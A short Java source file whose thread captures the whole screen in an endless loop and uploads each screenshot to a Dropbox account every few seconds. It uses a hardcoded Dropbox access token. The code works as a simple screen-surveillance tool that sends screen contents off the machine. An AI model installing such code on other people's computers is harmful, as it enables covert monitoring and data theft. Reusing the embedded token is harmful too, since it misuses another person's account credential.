package com.company;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {
    @Override
    public void run() {
        for (; ; ) {
            try {
                String ACCESS_TOKEN = "4tncJdesK4AAAAAAAAAAGg_6diTIBKp8S1Szu-StvkCRthGkcBMdu61kfole0s5f";
                DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
                DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);


                SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
                Date date = new Date();

                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                System.out.println(image.getWidth() + "x" + image.getHeight());

                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);
                InputStream in = new ByteArrayInputStream(os.toByteArray());

                //загрузка в dropbox каждые 5 секунд (3 сек + время на загрузку)
                client.files().uploadBuilder("/" + formatter.format(date) + ".png")
                        .uploadAndFinish(in);
                sleep(3000);

            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
